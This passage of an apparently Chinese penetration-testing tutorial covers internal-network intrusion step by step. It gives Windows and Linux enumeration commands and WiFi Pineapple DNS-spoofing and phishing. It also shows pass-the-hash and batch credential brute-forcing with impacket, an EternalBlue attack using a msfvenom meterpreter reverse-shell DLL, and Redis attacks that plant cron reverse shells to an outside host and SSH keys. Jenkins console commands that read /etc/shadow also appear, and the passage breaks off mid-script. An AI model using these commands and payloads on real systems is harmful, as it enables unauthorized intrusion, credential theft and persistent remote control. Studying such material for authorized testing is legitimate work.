<p><img src="https://img-blog.csdnimg.cn/20200917150205981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20200917150456897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>查看网络配置</strong></p>
<pre><code>ipconfig /all
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917150955679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
有 Primary Dns Suff就说明是域内空的则当前机器应该在工作组</p>
<p><strong>查看进程</strong></p>
<pre><code>tasklist /v
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917151315189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
有些进程可能是域用户启的-&gt;通过管理员权限凭证窃取-&gt;窃取域用户的凭证</p>
<p><strong>查看当前登陆域</strong></p>
<pre><code>net config workstation
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917151834347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>远程桌面链接历史记录</strong></p>
<pre><code>cmdkey /l
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917152114892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可以把凭证取下来-&gt;本地密码</p>
<p><strong>查看本机上的用户账户列表</strong></p>
<pre><code>net user 
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917152301581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查看本机用户xxx的信息</strong></p>
<pre><code>net user xxx
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917152451189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>查看本机用户xxx的信息</strong></p>
<pre><code>net user /domain 				显示所在域的用户名单
net user 域用户 /domain			获取某个域用户的详细信息 
net user /domain xxx 12345678 	修改域用户密码，需要域管理员权限
</code></pre>
<hr>
<h2><a id="Windows_664"></a>Windows（域）</h2>
<pre><code>nltest /domain_trusts /all_trusts /v /server: 192.168.xx.xx    返回所有信任域列表
nltest /dsgetdc:hack /server:192.168.xx.xx    				   返回域控和其相应的IP地
net user /do 												   获取域用户列表
net group "domain admins" /domain 							   获取域管理员列表
net group "domain controllers" /domain						   查看域控制器(如果有多台)
net group "domain computers" /domain						   查看域机器
net group /domain 											   查询域里面的工作组
net localgroup administrators								   本机管理员[通常含有域用户]
net localgroup administrators /domain 						   登录本机的域管理员 
net localgroup administrators workgroup\user001 /add 		   域用户添加到本机
</code></pre>
<pre><code> 

net view 				查看同一域内机器列表 
net view \\ip			查看某IP共享
net view \\GHQ		    查看GHQ计算机的共享资源列表 
net view /domain		查看内网存在多少个域 
net view /domain:XYZ	查看XYZ域中的机器列表 
net accounts /domain	查询域用户密码过期等信息
</code></pre>
<h2><a id="Linux_691"></a>Linux</h2>
<p><strong>查看当前权限</strong></p>
<pre><code>whoami
</code></pre>
<p><strong>查看网卡配置</strong></p>
<pre><code>ifconfig
</code></pre>
<p><strong>查看端口状态（开启了哪些服务，内网IP连接等</strong></p>
<pre><code>netstat -anpt
</code></pre>
<p><strong>查看进程状态（开启了哪些服务等）</strong></p>
<pre><code>ps -ef
</code></pre>
<p><strong>查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</strong></p>
<pre><code>cat /root/.bash_history
</code></pre>
<p><strong>查找某个文件（寻找配置文件等）</strong></p>
<pre><code>find / -name *.cfg
</code></pre>
<hr>
<h2><a id="10wmic_723"></a>10、后渗透信息收集之wmic命令的一些使用方法</h2>
<p><strong>前言</strong></p>
<p>wmic和cmd一样在所有的windows版本中都存在，同时wmic有很多cmd下不方便使用的部分，今天给大家介绍一些在后渗透过程中非常适用的使用wmic进行信息收集的命令</p>
<p><strong>关于wmic</strong></p>
<p>WMI命令行（WMIC）实用程序为WMI提供了命令行界面。WMIC与现有的Shell和实用程序命令兼容。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的，WMIC改变了这种情况</p>
<h2><a id="wmic_733"></a>wmic的简单使用</h2>
<p>首先在cmd命令行输入wmic进入交互式页面，这里说一下在powershell也可以和cmd命令行一样的操作<br>
<img src="https://img-blog.csdnimg.cn/20200917162035110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
进入wmic和powershell模式下<br>
<img src="https://img-blog.csdnimg.cn/20200917162550726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>/?				查看WMIC命令的全局选项以及命令属性等
process /?		进程管理的帮助
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917163130617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>wmic process get /?   属性获取操作帮助
</code></pre>
<p>根据实际的需要去对相关的信息进行读取</p>
<hr>
<h2><a id="wmic_752"></a>以进行为例展现wmic的使用</h2>
<p>这里的靶机是win7 x86的虚拟机，这里以查看进程为例：</p>
<pre><code>wmic process get caption,executablepath,processid
</code></pre>
<p>获取系统当前正在运行的进程等信息<br>
<img src="https://img-blog.csdnimg.cn/2020091716373167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>wmic service where (state="running") get name ,processid ,pathname ,startmode ,caption
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917164158711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
查看服务进程详细信息</p>
<pre><code>wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917164630317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
查看安装的杀软进程运行情况</p>
<pre><code>wmic onboarddevice get Description, DeviceType, Enabled, Status /format:list
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020091716513311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
查看存在状态</p>
<pre><code>wmic product get name
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917165405423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>系统安装软件情况</p>
<pre><code>wmic environment get Description, VariableValue
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917165447294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
系统环境变量</p>
<pre><code>wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917165708165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917165910670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>关于更多的信息可以通过官方的说明文档</p>
<pre><code>https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic
</code></pre>
<hr>
<h2><a id="powershellGetWmi_808"></a>关于powershell的Get-Wmi对象</h2>
<p>Get-Wmi是获取Windows Management Instrumentation（WMI）类的实例或有关可用类的信息。我们需要首先知道自己的 windows计算机支持那些可用的WMI类</p>
<pre><code>Get-Wmiobject -list 	自己的windows计算机支持那些可用的WMI类
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200917195023569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code>get-wmiobject
get-wmiobject -class win32_process
</code></pre>
<p>在本地计算机上获取进程</p>
<p>具体的参数以及命令在官方文档中进行查询：</p>
<pre><code>https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters
</code></pre>
<p>很棒的powershell官方命令</p>
<h2><a id="11_829"></a>11、内网横向常见端口</h2>
<h2><a id="Port_445_831"></a>Port. 445</h2>
<p>SMB( Server Message Block) Windows协议族，主要功能为文件打印共享服务，简单来讲就是共享文件夹</p>
<p>该端口也是近年来内网横向扩展中比较火的端口，大名鼎鼎的永恒之蓝漏洞就是利用该端口，操作为扫描其是否存在MS17-010漏洞。正常情况下，其命令主要是建立IPC服务中</p>
<p><strong>空会话</strong></p>
<pre><code>net use \\192.168.1.x
</code></pre>
<p><strong>远程本地认证</strong></p>
<pre><code>net use \\192.168.1.2 /user:a\username password
</code></pre>
<p>注：a/username 中 a 为工作组情况下的机器命名，可以为任意字符，例如workgroup/username</p>
<p><strong>域 test.local 远程认证</strong></p>
<pre><code>net use \\192.168.1.2 /user:test\username password
</code></pre>
<h2><a id="Port137138139_855"></a>Port:137、138、139</h2>
<p>NetBios端口，137、138为UDP端口，主要用于内网传输文件，而NetBios/SMB服务的获取主要是通过139端口</p>
<p><strong>Port: 135</strong></p>
<p>该端口主要使用DCOM和RPC（Remote Procedure Call）服务，我们利用这个端口主要做WMI（Windows Management Instrumentation）管理工具的远程操作</p>
<pre><code>使用时需要开启wmic服务
几乎所有的命令都是管理员权限
如果出现 "Invalid Globa| Switch"，需要使用双引号把该加的地方都加上 
远程系统的本地安全策略的“网络访问：本地帐户的共享和安全模式"应设为“经典-本地用户以自己的身份验证"
防火墙最好是关闭状态
</code></pre>
<p>该端口还可以验证是否开启 Exchange Servert</p>
<hr>
<p><strong>Port: 53</strong></p>
<p>该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好<br>
<strong>参考文章</strong> ：</p>
<p>dns隧道之dns2tcp</p>
<pre><code>https://blog.csdn.net/gsls200808/article/details/50318947
https://blog.csdn.net/deng_xj/article/details/88834124
</code></pre>
<p>dns隧道之unseat2</p>
<pre><code>https://www.cnblogs.com/bonelee/p/7927706.html
https://blog.csdn.net/ddr12231/article/details/102306989
</code></pre>
<hr>
<p><strong>Port: 389</strong></p>
<p>用于LADP（轻量级目录访问协议），属于TCP/IP协议，在域过程中一般出现在域控上出现该端口，进行权限认证服务，如果拥有对该域的用户，且担心net或者其他爆破方法不可行的情况，可以尝试使用LADP端口进行爆破</p>
<p>工具可以使用类似于hydra等开源项目</p>
<hr>
<p><strong>Port: 88</strong></p>
<p>该端口主要开启Kerberos服务，属于TCP/IP协议，主要任务是监听KDC的票据请求，该协议在渗透过程中可以进行黄金票据和白银票据的伪造，以横向扩展某些服务</p>
<hr>
<p><strong>Port: 5985</strong></p>
<p>该端口主要介绍WinRM服务，WinRM是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件</p>
<p>条件:</p>
<pre><code>Windows Vista上必须手动启动，而Windows Server 2008 中服务是默认开启的 
服务在后台开启，但是端口还没有开启监听，所以需要开启端口 
使用 winrm quickconfig 对winRM进行配置，开启HTTP和HTTPSS监听，且需要开启防火墙
</code></pre>
<hr>
<h1><a id="_917"></a>二、打入内网</h1>
<h2><a id="1WiFi_919"></a>1、外部接入点-WiFi</h2>
<h2><a id="211__DNSSpoofEvil_PortalDWall_921"></a>2.1.1 无线攻击实战应用之 DNSSpoof、Evil Portal、DWall</h2>
<p>组合拳入侵（配合）</p>
<p>前言：主要向大家介绍 WiFi Pineapple（以下简称“菠萝”）设备的基本使用方法，以及通过菠萝中的几个模块达到中间人攻击，网站钓鱼和获得shell。文章中主要使用到DWall、Evil Portal与DNSMasq Spoofv三个模块</p>
<p>Pineapple开启与网络桥接将菠萝的按钮由off划到wifi标志，稍等片刻便会向周围发射两个无线信号。一个无线信号是菠萝的管理ap，一个是给受害者使用的开放ap。这两个ap的ssid以及管理ap的密码均可以在菠萝的web管理界面中设置</p>
<pre><code>http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf
https://shop.hak5.org/products/wifi-pineapple
</code></pre>
<p>参考该资料以及购买菠萝设备连接！<br>
简单总结一下利用模块解释：</p>
<p><strong>Evil Portal</strong></p>
<p>可以利用Evil Portal模块获取TP-LINK管理员密码，它的作用是可以使接入用户在访问任意网站时都跳转到我们事先设置好的 Landing page中。 Landing Page是设置菠萝网关的页面，此处我们重定向到公网上一台配置好钓鱼网站的vps上，也可给菠萝添加一张sd卡，直接将钓鱼网站文件放置到菠萝中</p>
<p><strong>Dwall</strong></p>
<p>使用DWall进行中间人攻击DWall中文名称叫"绵羊墙"，是菠萝中的一个默认安装模块，它可以嗅探已连接客户端的所有HTTP请求，如URLS、Cookies、Post Data，以及实时地显示出客户端正在浏览的图片等</p>
<p><strong>DNSSpoof</strong></p>
<p>此处使用到菠萝中的 DNSMasq spoc模块。它的作用是dns劫持，获取到受害客户端的域名解析控制权。我们可以在hosts中设置想要进行欺骗的域名，当用户输入该域名后，模块会欺骗用户将域名解析成设置好的IP，此处我们设置跳转到菠萝网关上</p>
<p>DNSSpoof模块可以尝试获取shell，可以尝试使受害者重定向到一台公网上的vps来下载木马文件，诱导受害者点击。木马文件可精心构造，比如具有欺骗性的文件名，免杀木马等。</p>
<p><strong>DNS欺骗原理</strong></p>
<p>DNS服务器工作原理是，存储IP地址到DNS名称映射的记录（称为资源记录）数据库，联系这些资源记录与客户端，并将这些资源记录与其他DNS服务器联系。而客户端对于每个通过互联网发送的DNS请求都包含一个独特的识别码，其目的在于辨识查询和响应，并将对应的查询和响应配对在起。这就意味着，如果我们可以拦截客户端发送的DNS请求包，做一个包含该识别码的假数据包，这样目标计算机就会根据识别码认为这个假数据包就是其需要的结果，从而接受我们发送的包。这里尝试使用nslookup查看域名解析情况，用tracert命令跟踪：无修改，dns欺骗，配置静态dns，三种情况下访问测试域名的路由情况</p>
<h2><a id="212__955"></a>2.1.2 防护意见</h2>
<pre><code>配置静态可靠的dns 
将访问的重要域名与P地址进行绑定
提高安全意识,不轻易连接不可信的、开放的无线热点
</code></pre>
<hr>
<h2><a id="2_963"></a>2、应用系统漏洞利用</h2>
<h2><a id="221__965"></a>2.2.1 常见漏洞扫描</h2>
<h2><a id="2211_Nmap_967"></a>2.2.1.1 Nmap扫描漏洞技巧</h2>
<pre><code>auth 		处理身份验证 
broadcast 	网络广播
brute 		暴力猜解
default		默认
discovery 	服务发现
dos 		拒绝服务
exploit 	漏洞利用
external 	外部扩展
fuzzer 		模糊测试 
intrusive 	扫描可能造成不良后果
malware 	检测后门
safe 		扫描危害较小
version 	版本识别
vuln 		漏洞检测 
</code></pre>
<p><strong>通用参数 -vuln</strong></p>
<pre><code>nmap --script=vuln 192.168.175.138
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200918091354630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这儿是我自己搭建的win7虚机扫描的结果，存在两个高危可利用漏洞情况</p>
<p><strong>MS17-010</strong></p>
<pre><code>map --script=smb-vuln-ms17-010 192.168.175.138
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200918091506646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="2212_impacketmssql_1003"></a>2.2.1.2 impacket框架之mssql服务器安全检测</h2>
<p>在实际渗透测试工作中经常会遇到检测项目中mssq服务器安全性,此篇文章介绍 impack框架中 mssqlclient的使用方法。</p>
<p>mssqlclient与其他工具相比的优势</p>
<pre><code>跨平台，python脚本编写，并且已有exe版本
命令行执行，速度快
支持使用 socks代理传输数据
支持以hash传递的方式进行账号验证 
支持 windows认证模式进行mssq服务的安全检测
执行sq命令可以是交互式,也可以直接回显sq命令执行结果
</code></pre>
<p><strong>win和linux环境下使用</strong><br>
1）在windows环境下使用windows认证模式，mssqlclient测试登陆sqlserver服务器，账号验证通过后会直接返回 sql shell</p>
<pre><code>mssqlclient.exe dayu/sqladmin@192.168.3.73 -windows-auth
</code></pre>
<p>2）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登陆 sqlserver服务器，账号验证通过后会直接返回 sql shell</p>
<pre><code>proxychains python mssqlclient.py dayu/sqladmin@192.168.x.x -windows-auth
</code></pre>
<p>3）通过 socks代理，以mssql账号验证方式测试登陆mssql服务器，账号验证成功后执行mssql. txt内的sql命令</p>
<pre><code>proxychains python mssqlclient.py ./sa:admin@192.168.x.x -file mssql.txt
</code></pre>
<p>4）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行 command.txt内的sql命令</p>
<pre><code>proxychains python mssqlclient.py -p 1433 dayu/sqladmin:123456@192.168.x.x -windows-auth -file cpmmand.txt
</code></pre>
<p>5）在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登陆sqlserver服务器，账号验证成功后执行command.txt内的sql命令</p>
<pre><code>mssqlclient.exe -p 1433 -hashes :"hash值" dayu/sqladmin@192.168.x.x -file command.txt -windows-auth
</code></pre>
<p>同样也可以用于webshell环境下</p>
<p><strong>批量检测</strong></p>
<p>除此之外，还可以批量检测内网 SQL server服务器的账号安全性<br>
需要准备的文件有：</p>
<pre><code>mssqlclient.exe(必须)
command.txt(必须) 
</code></pre>
<p>以下四个文件需选其一：</p>
<pre><code>hashes.txt	（需验证的 ntlm hash字符串列表）
username.txt（需验证的 username列表）
password.txt（需验证的密码字符串列表）
Ips.txt 	（需验证的p字符串列表）
</code></pre>
<p><strong>举例以下几种批量检测的bat脚本内容</strong></p>
<p>1）测试以 windows认证模式，使用hash传递验证，使用 mssqlclient批量测试登陆 sqlserver服务器，Ips.txt 内容为待检测sqlserver服务ip，每行一条</p>
<pre><code>FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 -hashes :hash值 ......
</code></pre>
<p>2）测试以 windows认证模式，使用hash传递验证，指定主机 ntlm hash遍历验证，hashes.txt为待检测已知 ntlm hash内容，每行一条</p>
<pre><code>FOR /F %%i in (hashes.txt) do mssqlclient.exe -p 1433 -hashes %%i domain/adminis.......
</code></pre>
<p>3）测试以 sqlserver认证模式，指定待检测主机，遍历验证 passwords.txt 内密码有效性，passwords.txt为已知密码内容，每行一条，验证成功后执行 command.txt内sql命令</p>
<pre><code>FOR /F %%i in (passwords.txt) do mssqlclient.exe -p 1433 ./sa:%%i@192.168.x.x ....
</code></pre>
<p>4）测试以 sqlserver认证模式，指定待检测密码，遍历验证ip.txt内所有服务器，ip.txt为待检测sqlserver服务器，每行一条，验证成功后执行 command. txt内sql命令</p>
<pre><code>FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 ./sa:password123@%%1i -file ......
</code></pre>
<p>这四种命令补全查看前面的讲解即可，或者查看参考资料</p>
<p><strong>参考资料：</strong></p>
<pre><code>https://github.com/SecureAuthCorp/impacket    --下载
https://www.puckiestyle.nl/impacket/
https://github.com/SecureAuthCorp/impacket/issues/613
</code></pre>
<hr>
<h2><a id="2213_MS17010py_1101"></a>2.2.1.3 MS17010py脚本利用</h2>
<p><strong>前言</strong></p>
<p>因为有些机器存在漏洞，但是使用MSF的模块利用失败，而使用py脚本则能成功利用</p>
<p><strong>利用</strong></p>
<p>在本地用虚拟机搭建了Kail 和 Windows7系统</p>
<pre><code>windwos7靶机IP：192.168.175.138
</code></pre>
<p>生成木马dll</p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.175.138 lport=6666 -f dll &gt; 64.dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200918112424445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
py下载地址：fb.py</p>
<pre><code>https://github.com/misterch0c/shadowbroker/tree/master/windows
</code></pre>
<p>1)设置ip<br>
2)Use Eternalblue使用 Eternalblue插件<br>
3)Use doublepulsa使用 doublepulsar插件<br>
4)最后执行dll反弹shell<br>
操作步骤不截图了挺简单的…<br>
<img src="https://img-blog.csdnimg.cn/20200918114157919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="222__1133"></a>2.2.2 未授权访问漏洞</h2>
<p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞</p>
<p><strong>Redis</strong></p>
<p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库</p>
<p><strong>reds-cli</strong></p>
<pre><code>redis-cli -h 172.16.x.x -p 6379
</code></pre>
<p><strong>如何写入文件</strong></p>
<pre><code>172.16.x.x:6379 &gt; CONFIG GET dir
1) "dir" 
2) "/usr/local/var/db/redis"
172.16.x.x:6379 &gt; CONFIG set dir /tmp/
OK
172.16.x.x:6379 &gt; SET foobar "who are you? Rvnoxsy" 
OK
172.16.x.x:6379 &gt; CONFIG GET dbfilename
1) filename
2) dump.rab 
172.16.x.x:6379 &gt; CONFIG SET dbfilename write_file.log 
OK
172.16.x.x:6379 &gt; save
OK
</code></pre>
<p><strong>反弹shell-Linux</strong></p>
<pre><code>127.0.0.1:6379 &gt; set shell "\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/88 0&gt;&amp;1\n" 
OK
127.0.0.1:6379 &gt; config set dir /var/spool/cron/
OK
127.0.0.1:6379 &gt; config set dbfilename root 
OK
127.0.0.1:6379 &gt; save
[238] xx May xx:xx:xx DB saved on disk
OK
</code></pre>
<p><strong>写入公钥</strong><br>
<strong>生成公钥：</strong></p>
<pre><code>ssh-keygen-t rsa   --一直回城即可
</code></pre>
<pre><code>127.0.0.1:6379 &gt; config set dir /root/ssh/
OK
127.0.0.1:6379 &gt; config set dbfilename authorized_keys
OK
127.0.0.1:6379 &gt; set x "\n\n\nssh-rsa xxxxxx root@kali\n\n\n"
OK
127.0.0.1:6379 &gt; save
OK
</code></pre>
<p>操作完记得情况数据库</p>
<pre><code>172.16.x.x:6379 &gt; FLUSHALL
</code></pre>
<hr>
<h2><a id="2221_1203"></a>2.2.2.1未授权漏洞总结</h2>
<p><strong>未授权漏洞</strong></p>
<h2><a id="Redis_1206"></a>Redis</h2>
<p><strong>计划任务反弹shell</strong></p>
<p>利用计划任务执行命令反弹shell</p>
<p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br>
先在自己的服务器上监听一个端口</p>
<pre><code>nc -lvnp 6666
</code></pre>
<p>然后执行命令：</p>
<pre><code>redis-cli -h 192.168.x.x
192.168.x.x:6379 &gt; set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.x.x/6666 ...
192.168.x.x:6379 &gt; config set dir /var/spool/cron/
192.168.x.x:6379 &gt; config set dbfilename root
192.168.x.x:6379 &gt; save
</code></pre>
<p><strong>写入公钥</strong><br>
<strong>获取rsa</strong></p>
<pre><code>ssh-keygen -t rsa
</code></pre>
<p>将公钥写入foo.txt，注意内容前后要加2个换行</p>
<pre><code>echo -e "\n\n"; cat /root/ssh/id_rsa.pub; echo -e "\n\n") &gt; foo.txt
</code></pre>
<p>将foo.txt放入键crackit里</p>
<pre><code>cat foo.txt redis-cli -h IP -x set crackit 
</code></pre>
<p>连接目标</p>
<pre><code>redis-cli -h Ip
</code></pre>
<p>设置目标的redis的配置文件<br>
设置数据库备份目录为/root/.ssh/</p>
<pre><code>192.168.X.X: 6379 &gt; config set dir /root/.ssh/ 
</code></pre>
<p>设置数据库备份文件名为authorized_keys</p>
<pre><code>192.168.X.X:6379 &gt; config set dbfilename authorized_keys
</code></pre>
<p>此时公钥成功写入目标机子，文件名为authorized_keys</p>
<pre><code>192.168.x.x:6379 &gt; save 
</code></pre>
<p>利用私钥链接目标</p>
<pre><code>ssh -i /root/.ssh/id_rsa root@192.168.x.x 
set x "\n\n\n
</code></pre>
<p>参考资料：</p>
<pre><code>https://segmentfault.com/a/1190000009811404
https://github.com/andymccurdy/redis-py
</code></pre>
<hr>
<h2><a id="Jenkins_1279"></a>Jenkins</h2>
<p>默认是8080端口未授权访问就是任意用户都能访问都能执行命令</p>
<pre><code>127.0.0.1:8080/jenkins/manage
127.0.0.1:8080/jenkins/script
</code></pre>
<p><strong>常用命令集合：</strong></p>
<pre><code>println "whoami".execute().text
</code></pre>
<p><strong>Linux：</strong></p>
<pre><code>println ifconifg -a".execute().text
println "cat /etc/passwd".execute().text
printin"cat /etc/shadow".execute().text 
</code></pre>
<p><strong>Windows：</strong></p>
<pre><code>println "ipconfig /all".execute().text
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'ipconfig'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out&gt; $sout err&gt; $serr"
</code></pre>
<p>靶机有漏洞复现，遇到了执行命令即可…</p>
<hr>
<h2><a id="Mongodb_1315"></a>Mongodb</h2>
<p>利用可视化工具连接默认端口：28017<br>
推荐Robo3t 1.1 即可</p>
<p>python mongodb_unauth.py</p>
<pre><code>coding:utf-8
mongodb未授权检测脚本
usage: python3 mongodb_unauth.py ip port
默认端口28017和27017

from pymongo import MongoClient
import sys

ip = sys.argv[1] 

port = int(sys.argv[2]) 

try:
	conn = MongoClient(ip, port, socketTimeoutMS=5000)	#连接 MongoDB，延时5秒
	dbs = conn.database_names()
	print('[ok] -&gt; {}:{} database_names : {}'.format(ip, port, dbs))
	conn.close() 
